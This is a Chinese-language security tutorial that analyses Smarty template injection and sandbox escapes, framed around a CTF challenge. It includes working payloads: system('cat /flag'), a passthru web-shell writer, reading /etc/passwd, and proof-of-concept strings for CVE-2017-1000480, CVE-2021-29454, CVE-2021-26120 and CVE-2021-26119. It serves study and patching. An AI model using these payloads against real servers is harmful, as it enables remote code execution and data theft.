# Smarty 模板注入与沙箱逃逸

阅读量 **200370**

发布时间 : 2022-04-22 14:30:12

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01f6607befb60bcefe.jpg)

## 前言

Smarty 模板是基于 PHP 开发的模板，我们可以利用 Smarty 实现程序逻辑与页面显示（HTML/CSS）代码分离的功能。

模板引擎中花哨的功能导致了模板注入的出现，也就是SSTI。但是在谈及 SSTI 的时候，大家往往还是会去重点关注 python 语言下的 flask
模板，而一些其他语言、其他模板的相关资料反而非常稀缺，这里也是根据红明谷杯的一道题目发现的，我系统学习了 Smarty 的模板注入并进行了总结。

## 前置

###  文档

<https://www.smarty.net/about_smarty>

在模板注入中，我们所利用的都是模板中提供的功能，或者模板中某些功能的漏洞，这就要求我们需要对文档中的有效内容有较高的搜集能力与判断能力。

###  测试环境

写个 demo 来进行测试，具体扔到我的项目里了

demo 中具体产生漏洞的就是下面这里的代码：

`$smarty->display("string:". $name);`

属于是完全信任用户的输入的模板利用方式了，这里用来测试各种攻击方式。

###  测试方法

![](https://p0.ssl.qhimg.com/t01003b7e476554b63a.png)

还是 HackTricks（[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection）](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection%EF%BC%89) 中的这张老图，这里利用的实际上是各种语法来进行判断，比如单括号内可以执行表达式，
以{**} 为注释符就可以判断我们的模板为 Smarty 模板，具体的语法还是要去看手册。

## 注入攻击

在模板注入中我们进行攻击的方式所依赖的是模板引擎中的各种标签，标签为了实现功能，很多时候会进行命令执行等操作，有时一些正常的功能也会被恶意利用而导致一系列的问题，下面就来总结一下常用的标签。

###  前期工作

`{$smarty.version}`

返回版本信息，有助于根据版本进行后续攻击手段的选择

![](https://p4.ssl.qhimg.com/t0194e0c9895c556595.png)

**${smarty.template}**

返回当前模板的文件名（如果使用了的话）

关于使用模板的部分大家可以去看相关的文档或者一些相关教程（[https://www.w3cschool.cn/smarty/smarty-resourcescustom.html）](https://www.w3cschool.cn/smarty/smarty-resourcescustom.html%EF%BC%89)

###  常规攻击方式

**获取类的静态方法**

我们可以通过 self 标签来获取 Smarty 类的静态方法，比如我们可以获取 getStreamVariable 方法来读文件

`public function getStreamVariable($variable)  
{  
$_result = '';  
$fp = fopen($variable, 'r+');  
if($fp) {  
while (!feof($fp) && ($current_line = fgets($fp)) !== false) {  
$_result .= $current_line;  
}  
fclose($fp);  
return $_result;  
}  
$smarty = isset($this->smarty) ? $this->smarty : $this;  
if ($smarty->error_unassigned) {  
throw new SmartyException('Undefined stream variable "'. $variable . '"');  
} else{  
return null;  
}  
}`

{self::getStreamVariable(“file:///etc/passwd”)}

不过这种利用方式只存在于旧版本中，而且在 3.1.30 的 Smarty 版本中官方已经将 getStreamVariable 静态方法删除。

其他的一些类中的方法也是一样，会受到版本的限制，比如 writeFile 方法等也是同理，在高版本下同样不能使用。

`{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php
passthru($_GET['cmd']); ?>",self::clearConfig())}`

**{literal} 标签**

{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。

在 PHP5 环境下存在一种 PHP 标签， <scriptlanguage=”php”></script>，我们便可以利用这一标签进行任意的 PHP
代码执行。

通过上述描述也可以想到，我们完全可以利用这一种标签来实现 XSS 攻击，这一种攻击方式在 SSTI
中也是很常见的，因为基本上所有模板都会因为需要提供类似的功能。

`{literal}alert('xss');{/literal}`

**{if} 标签**

Smarty 的 {if} 条件判断和 PHP 的 if 非常相似，只是增加了一些特性。每个 {if} 必须有一个配对的 {/if}，也可以使用
{else} 和 {elseif} ，全部的PHP条件表达式和函数都可以在 {if} 标签中使用。

例如：

`{if phpinfo()}{/if}  
{if readfile ('/flag')}{/if}  
{if show_source('/flag')}{/if}  
{if system('cat /flag')}{/if}  
etc.`

![](https://p1.ssl.qhimg.com/t01349a277ebb49d7d1.png)

**{php} 标签**

Smarty3 官方手册中明确表示已经废弃 {php} 标签，不建议使用。在 Smarty3.1， {php} 仅在 SmartyBC 中可用。

![](https://p2.ssl.qhimg.com/t01d82939b672aa292d.png)

通常情况下我们包含的是上面的 Smarty.class.php

例子：

`{php}echo id;{/php}`

![](https://p2.ssl.qhimg.com/t01165a14d4ce7852e4.png)

###  CVE 分析

**CVE-2017-1000480**

测试代码

`<?php  
define('HOST_DIR', __DIR__ . '/../');  
define('SMARTY_LIBS', HOST_DIR . '/vendor/smarty/libs/Smarty.class.php');  
define('SMARTY_COMPILE_DIR', HOST_DIR . 'app/templates_c');  
define('SMARTY_CACHE_DIR', HOST_DIR . 'app/cache');  
require_once(SMARTY_LIBS);  
class testSmarty extends Smarty_Resource_Custom  
{  
protectedfunction fetch($name, &$source, &$mtime)  
{  
$template = "CVE-2017-1000480 smarty PHP code injection";  
$source = $template;  
$mtime = time();  
}  
}  
$smarty = new Smarty();  
$smarty->registerResource('test', new testSmarty);  
$smarty->display('test:'.$_GET['eval']);  
?>`

我们可以利用 _/ /_ 或者 */ // 等方式来实现代码执行

![](https://p2.ssl.qhimg.com/t0148816d9a6b2c61f5.png)

**具体分析：**

**参考**

<https://www.cnblogs.com/magic-zero/p/8351974.html>

<https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>

跟进 display 方法

![](https://p1.ssl.qhimg.com/t01928216dbfc3d53fe.png)

我们只传入了一个参数也就是说我们传入给 display 的参数就是这里的 $template，跟进 _execute()

这个方法写的很长，我们只关注我们要关注的部分

![](https://p0.ssl.qhimg.com/t0192bd77dbd75a2a43.png)

我们传入的显然进入了最后的 else，可以看到我们调用 createTemplate() 创建了模板，这里返回的 $template 是一个
SmartyInternalTemplate 对象

接下来会进入到一个 try 结构体中，这里我们重点关注的代码是这里的 render 方法

![](https://p1.ssl.qhimg.com/t012ca61f6a514fe39f.png)

跟进到 SmartyInternalTemplate 类中，这里因为我们之前没有进行过模板缓存文件的生成会进入这里的 else，我们继续跟进
smartytemplatecompiled 类中的这个 render

![](https://p5.ssl.qhimg.com/t01fa7fb43f02d6ddaf.png)

可以看到这里的 $this->process($_template)；调用，

![](https://p4.ssl.qhimg.com/t01a35cde90fa4d0f26.png)

继续跟进这里的 process 方法

![](https://p4.ssl.qhimg.com/t01c2b9afd79a91aa85.png)

跟进这里的 $this->compileTemplateSource($_smarty_tpl)

![](https://p2.ssl.qhimg.com/t0157f9b4ce0e3ba8ce.png)

可以看到这里的
$this->write($_template,$_template->compiler->compileTemplate($_template))
调用，就在下面

![](https://p2.ssl.qhimg.com/t011e06b7b25331b2e6.png)

调用了 writeFile 函数，跟进，在 SmartyInternalRuntime_WriteFile 类中

![](https://p1.ssl.qhimg.com/t0166fd8a0ea0373882.png)

这里利用了 fileputcontents 来写文件，可以看到我们的 SMARTYCOMPILEDIR

![](https://p4.ssl.qhimg.com/t01f383822433c506de.png)

可以看到我们生成了 php 文件，生成文件的内容在 smarty_internal_runtime_codeframe 类中的 create
决定，我们可以从
$this->write($_template,$_template->compiler->compileTemplate($_template)) 中的
compileTemplate 跟进到

![](https://p4.ssl.qhimg.com/t01ba9a3f674ec54905.png)

![](https://p0.ssl.qhimg.com/t017a1004cf2f2fbb69.png)

文件中有一部分注释内容，我们可以左右闭合，将我们的 php 代码插入到里面

![](https://p3.ssl.qhimg.com/t015aeecea208904308.png)

这里的 php 文件甚至不用我们手动包含，在 process 方法中有一处 loadCompiledTemplate

![](https://p2.ssl.qhimg.com/t01fa23fc004f595b8c.png)

跟进可以看到

![](https://p0.ssl.qhimg.com/t01b51c568d18f08dfd.png)

eval(“?>”.file_get_contents($this->filepath)) 相当于一个远程文件包含，这里调用了 include
，我们之前写入缓存的php文件也就被包含进而执行了

而在高版本中，这里新增了一个 str_replace，将多行注释的符号用一个空格分隔开了

![](https://p2.ssl.qhimg.com/t01e69174fe0a999f97.png)

**CVE-2021-29454**

这个 CVE 在刚刚结束不久的 红明谷2022 中刚露完脸，是由于 math 标签中的 eval 导致的任意代码执行。

我们可以通过 PHP 中的一系列绕过操作实现命令执行的目的，能够达到目的的代码样式很多。

比如我们可以通过取字符的方式来进行构造，这里利用到了 再次赋值 的手法来进行构造（这里是看的 Rayi 师傅的
payload，正常情况下的取值构造还是比较麻烦的，字母的限制比较大。

![](https://p1.ssl.qhimg.com/t01092a1a1c0a6938a7.png)

利用未限制的数学函数能构造出来个 exec，不过 exec 没有回显，命令啥的也要继续使用几个数学函数构造，比较麻烦。

`"(\'exp\'[0].\'exp\'[1].\'exp\'[0].\'cos\'[0])"`

或者比较容易理解的这种

![](https://p4.ssl.qhimg.com/t0136a910db2e1c4e54.png)

这里涉及到了 PHP 对进制的识别的机制，比如 \120这种格式就会被默认的识别为八进制，我们这里就是利用了数字和 \
都存在的情况下对八进制的解析构造了任意的字符串

![](https://p0.ssl.qhimg.com/t01637695eadd31d359.png)

而 \x70 就会被默认识别为十六进制

![](https://p3.ssl.qhimg.com/t016987a2c2e6d2978b.png)

根据下面对正则的分析我想到，甚至我们直接使用无数字字母 RCE 也可以绕过

![](https://p3.ssl.qhimg.com/t01cdb560f2fa95867a.png)

**具体分析**

在 Smarty 中与 math 标签相关的部分位于 plugins 目录下的 function.math.php

![](https://p2.ssl.qhimg.com/t01e25bef538e2288f8.png)

在其中用类似白名单的方式将数学函数写进了数组，只允许这些方法通过，同时还严格过滤了 $，以及反引号

结合正则过滤了我们在 equation 中的输入

![](https://p5.ssl.qhimg.com/t0107ffd317d3bc20a1.png)

包括十六进制的格式，后面的 [a-zA-Z _\x7f-\xff][a-zA-Z0-9_ \x7f-\xff]* 表示的是PHP
中的变量，根据变量的命名规则，一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。按照正常的正则表达式它被写成上面这个样子。

然后就会被送进 eval 了

![](https://p0.ssl.qhimg.com/t01eab2bffc9a6b2cc4.png)

不过显然我们是可以进行绕过的，比如上面写的几种

例题：[红明谷 2022] Smarty calculator

## 沙箱逃逸

###  基础沙箱逃逸

沙箱，或者叫沙盒，在英语中为
sandbox，在计算机安全领域中是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。

沙箱逃逸，就是在一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。

在一个 Smarty 模板中，我们可以用 enableSecurity 来开启安全模式，也就相当于开启了沙箱

`<?php  
include_once('../vendor/smarty/libs/Smarty.class.php');  
$smarty = new Smarty();  
$smarty->enableSecurity();  
$smarty->display($_GET['poc']);`

通过设置 Smarty_Security 实例的一系列的参数我们可以获得更加严格的沙箱，官方文档中的实例如下

`<?php  
require'Smarty.class.php';  
$smarty = new Smarty();  
$my_security_policy = new Smarty_Security  
($smarty);  
// disable all PHP functions  
$my_security_policy->php_functions = null;  
// remove PHP tags  
$my_security_policy->php_handling = Smarty::PHP_REMOVE;  
// allow everthing as modifier  
$my_security_policy->$modifiers = array();  
// enable security  
$smarty->enableSecurity($my_security_policy);  
?>`

或者更严格的例子：

`<?php  
include_once('../vendor/smarty/libs/Smarty.class.php');  
$smarty = new Smarty();  
$my_security_policy = new Smarty_Security($smarty);  
$my_security_policy->php_functions = null;  
$my_security_policy->php_handling = Smarty::PHP_REMOVE;  
$my_security_policy->php_modifiers = null;  
$my_security_policy->static_classes = null;  
$my_security_policy->allow_super_globals = false;  
$my_security_policy->allow_constants = false;  
$my_security_policy->allow_php_tag = false;  
$my_security_policy->streams = null;  
$my_security_policy->php_modifiers = null;  
$smarty->enableSecurity($my_security_policy);  
$smarty->display($_GET['poc']);`

最后我们的参数被传入
display，而从上面的内容可以想到，这里我们是可以进行模板注入的，而如果我们的注入的内容能够帮助我们很好地绕过这里的安全沙箱，也就是沙箱逃逸了。

**CVE-2021-26120**

CVE-2021-26120 为 SmartyInternalRuntime_TplFunction 沙箱逃逸漏洞，所利用 POC 如下：

`string:{function+name='rce(){};system("id");function+'}{/function}`

我们可以先利用 简单的 function 标签来进行一下测试

{functionname=’test’}{/function} ，可以看到生成的缓存文件如下

![](https://p4.ssl.qhimg.com/t016fb04a7f1ed4b735.png)

我们只要将前后闭合，将我们要执行的代码插入到闭合两端的中间就可以借助缓存文件执行。

![](https://p2.ssl.qhimg.com/t018f3dcebc219ab34b.png)

![](https://p0.ssl.qhimg.com/t01a24cb5af732faff6.png)

**CVE-2021-26119**

CVE-2021-26119 为 Smarty template_object 沙箱逃逸 PHP 代码注入漏洞，所利用 POC 如下：

`string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}`

请求两次后触发，请求需要触发两次的原因是第一次缓存文件被写入，然后被覆盖。第二次触发缓存并包含文件以进行远程代码执行。相关代码在 process 函数处。

![](https://p3.ssl.qhimg.com/t01647fa1c7e60c87f4.png)

这里写了，如果不存在缓存文件就 creat，如果已存在则包含，不过这里的 loadCompliedTemplate 这里竟然不能包含执行。

这个 POC 并不能绕过我们上面所写的最难绕过的那一种沙箱，只能绕过不是那么严格的沙箱，我推测是因为我们所写入的 PHP 标签等内容会触发这里的安全机制。

![](https://p2.ssl.qhimg.com/t0122f7512f8e6cdc29.png)

这里的这个 Payload 所使用的正是我们一开始所说的类的静态方法，是对调用类中静态方法的一种绕过。静态方法中的参数不再使用 self 标签，而是使用了
$smarty.template_object->smarty 和 $smarty.template_object->compiled->filepath
两处调用。

具体的分析可以参照这篇文章（[https://www.anquanke.com/post/id/235505#h3-4）](https://www.anquanke.com/post/id/235505#h3-4%EF%BC%89)

我认为依照这种思路是可以去寻找更多的静态方法和参数来实现更多操作的。

## 总结

关于 PHP 语言的模板引擎我们可以对其 PHP 源码进行更加深入的审计，就和挖掘 CMS
中的漏洞一样重点关注包含可控变量的函数，再结合对模板本身的功能的跟踪与动调，我们就可以实现 SSTI 漏洞的挖掘了。

Smarty 引擎的模板注入到这里我们就基本上总结完毕了，在 Smarty
本身所提供的安全模式下我们存在可以进行沙箱逃逸的方式，在未开启安全模式的情况下我们甚至可以借助一些基本的标签实现命令执行。

这也就要求我们要尽早更新 Smarty 版本，对安全模式的功能进行更严格的设置等，以避免模板注入的危害。

###  参考链接

<https://www.smarty.net/about_smarty>

HackTricks

<https://www.anquanke.com/post/id/235505#h3-4>

<https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html>

<https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>

<https://blog.csdn.net/qq_45521281/article/details/107556915>

<https://xz.aliyun.com/t/11085>

<https://www.cobalt.io/blog/a-pentes>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **长亭科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/272393](/post/id/272393)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

 **+1** __4赞

 __收藏

![](https://p2.ssl.qhimg.com/t012a2b2cc9165a693a.jpg) 长亭科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

